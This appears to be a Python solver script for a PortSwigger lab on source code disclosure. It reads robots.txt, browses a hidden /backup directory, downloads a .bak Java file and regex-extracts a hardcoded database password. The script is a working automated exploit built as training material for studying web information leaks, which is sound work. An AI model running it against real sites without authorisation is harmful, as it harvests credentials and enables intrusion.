# Lab 03 — Source code disclosure via backup files
# PortSwigger: https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-via-backup-files
#
# Vulnerability: robots.txt discloses a hidden /backup directory, which
#                contains a .java.bak backup copy of application source
#                code — served as plain text, revealing a hardcoded
#                database password
# Aim:           Identify and submit the hardcoded database password
#
# Technique:
#   robots.txt provides zero actual access control — it's just a hint
#   for crawlers. Visit the disallowed path directly, find the backup
#   file, and read the leaked source.
#
# Usage: python information_disclosure_lab03.py <url>

import sys
import re
import urllib3
from proxies import proxies
from information_disclosure_utils import banner, section, make_session, print_box

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

if __name__ == "__main__":
    banner()
    section("LAB 03 — SOURCE CODE DISCLOSURE VIA BACKUP FILES")

    if len(sys.argv) != 2:
        print("  Usage: python information_disclosure_lab03.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    # ── Step 1: check robots.txt for disallowed paths ────────────────────────
    print("  ── Step 1: check robots.txt for disallowed directories\n")
    r_robots = session.get(f"{url}/robots.txt")
    print_box("robots.txt contents", r_robots.text)

    disallowed_paths = re.findall(r'Disallow:\s*(\S+)', r_robots.text)
    backup_path = next((p for p in disallowed_paths if "backup" in p.lower()), None)

    if not backup_path:
        print("  ?  No obviously backup-related path found — trying '/backup' directly\n")
        backup_path = "/backup"

    print(f"  ✔  Investigating disallowed path: {backup_path}\n")

    # ── Step 2: browse the backup directory ───────────────────────────────────
    print("  ── Step 2: fetch the backup directory listing\n")
    r_backup_dir = session.get(f"{url}{backup_path}")
    print(f"  ℹ  Status: {r_backup_dir.status_code}")

    bak_file_match = re.search(r'href=["\']([^"\']*\.bak)["\']', r_backup_dir.text, re.IGNORECASE)
    if not bak_file_match:
        bak_file_match = re.search(r'([A-Za-z0-9_]+\.[a-z]+\.bak)', r_backup_dir.text, re.IGNORECASE)

    if not bak_file_match:
        print("  ✘  Could not auto-discover a .bak file in the listing.")
        print_box("Raw directory listing (truncated)", r_backup_dir.text[:800])
        sys.exit(1)

    bak_filename = bak_file_match.group(1)
    bak_path = bak_filename if bak_filename.startswith("/") else f"{backup_path}/{bak_filename}"
    print(f"  ✔  Found backup file: {bak_path}\n")

    # ── Step 3: fetch and inspect the leaked source ───────────────────────────
    print("  ── Step 3: fetch the leaked source file\n")
    r_source = session.get(f"{url}{bak_path}")
    print(f"  ℹ  Status: {r_source.status_code}\n")

    password_match = re.search(
        r'password\s*=\s*["\']([^"\']+)["\']', r_source.text, re.IGNORECASE
    )

    if password_match:
        print_box("LEAKED DATABASE PASSWORD", password_match.group(1))
    else:
        print("  ?  Could not auto-extract the password — inspect the leaked")
        print("     source below manually.")
        print_box("Leaked source code (truncated)", r_source.text[:1500])
